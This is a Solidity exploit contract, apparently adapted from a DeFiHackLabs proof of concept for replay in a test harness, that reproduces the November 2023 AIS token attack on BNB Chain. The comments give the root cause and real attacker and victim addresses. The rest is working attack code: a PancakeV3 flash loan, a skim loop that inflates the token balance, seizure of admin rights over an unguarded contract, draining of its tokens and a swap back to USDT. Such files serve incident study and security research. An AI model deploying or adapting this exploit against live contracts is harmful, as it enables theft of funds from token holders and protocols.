// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

// Synthetic standalone exploit for the EVM Playground (2023-11-AIS).
// The DeFiHackLabs PoC (test/AIS_exp.sol) runs the attack INLINE in the
// Foundry test contract itself -- the ONLY cheatcodes used are in setUp()
// (createSelectFork, vm.label), which the harness's anvil_state.json replay
// already replicates, plus a `Test`-only `emit log_named_decimal_uint(...)`
// debug print. No `deal`/`prank`/storage cheatcodes are used in the attack
// path itself, so this is otherwise a byte-for-byte copy of the inline
// attack with those three things dropped: the `forge-std/Test` import/
// inheritance, `setUp()`, and the debug log line. Profit is read directly
// off this contract's own USDT balance (never forwarded to a separate EOA
// in the original test -- `address(this)` IS the attacker/exploit contract
// there), so `profitReceiver` in the config is "exploit".
//
// @KeyInfo -- Total Lost : ~$61k
// Frontrunner: https://bscscan.com/address/0x7cb74265e3e2d2b707122bf45aea66137c6c8891
// Original Attacker: https://bscscan.com/address/0x84f37F6cC75cCde5fE9bA99093824A11CfDc329D
// Frontrunner Contract: https://bscscan.com/address/0x15ffd1d02b3918c9e56f75e30d23786d3ef2b5bc
// Original Attack Contract: https://bscscan.com/address/0xf6f60b0e83d9837c1f247c575c8583b1d085d351
// Vulnerable Contract:
// https://bscscan.com/address/0x6844ef18012a383c14e9a76a93602616ee9d6132
// https://bscscan.com/address/0xffac2ed69d61cf4a92347dcd394d36e32443d9d7
// Attack Tx: https://bscscan.com/tx/0x0be817b6a522a111e06293435c233dab6576d7437d0e148b45efcf7ab8a10de0
//
// @Analysis
// https://twitter.com/Phalcon_xyz/status/1729861048004391306
//
// Root cause: AIS (Ai Smart, a "harvest"-style rebasing token) exposes a
// privileged `harvestMarket()` that any caller can trigger, and pairs it
// with a separate admin-gated `VulContract` that can be handed a NEW admin
// via `setAdmin()` with no access control on WHO may call it. The attacker
// takes a PancakeV3 flash loan, swaps into AIS, then repeatedly transfers
// AIS into the AIS/USDT pair and `skim()`s it out to itself -- inflating
// their own AIS balance for free by exploiting a fee-accounting quirk in
// the token's transfer/skim interaction. It then calls the unguarded
// `harvestMarket()` and `vulContract.setAdmin(address(this))` to seize
// admin rights over `VulContract`, uses that to `transferToken()` most of
// VulContract's AIS holdings to itself, and calls `AIS.setSwapPairs(address(this))`
// (also unguarded) before swapping everything back to USDT and repaying the
// flash loan -- pocketing the difference.

interface IAIS is IERC20 {
    function setSwapPairs(address _address) external;
    function harvestMarket() external;
}

interface VulContract {
    function setAdmin(address _admin) external;
    function transferToken(address _from, address _to, uint256 _tokenId) external;
}

contract AISExploit {
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IAIS AIS = IAIS(0x6844Ef18012A383c14E9a76a93602616EE9d6132);

    Uni_Pair_V3 pool = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
    Uni_Pair_V2 usdt_ais = Uni_Pair_V2(0x1219F2699893BD05FE03559aA78e0923559CF0cf);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    VulContract vulContract = VulContract(0xFFAc2Ed69D61CF4a92347dCd394D36E32443D9d7);

    function testExploit() external {
        usdt.approve(address(router), type(uint256).max);
        AIS.approve(address(router), type(uint256).max);

        pool.flash(address(this), 3_000_000 ether, 0, new bytes(1));
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        swap(3_000_000 ether, address(usdt), address(AIS));

        usdt_ais.skim(address(this));
        for (uint256 i = 0; i < 100; i++) {
            uint256 balance = AIS.balanceOf(address(this));
            AIS.transfer(address(usdt_ais), balance * 90 / 100);
            AIS.transfer(address(usdt_ais), 0);
            usdt_ais.skim(address(this));
            usdt_ais.skim(address(this));
        }

        AIS.harvestMarket();
        vulContract.setAdmin(address(this));

        uint256 amount = AIS.balanceOf(address(vulContract)) * 90 / 100;
        vulContract.transferToken(address(AIS), address(this), amount);
        AIS.setSwapPairs(address(this));

        AIS.transfer(address(usdt_ais), AIS.balanceOf(address(this)));
        AIS.transfer(address(usdt_ais), 0);
        swap(0, address(AIS), address(usdt));

        usdt.transfer(address(pool), 3_000_000 ether + fee0);
    }

    function swap(uint256 amountIn, address tokenIn, address tokenOut) internal {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp);
    }
}
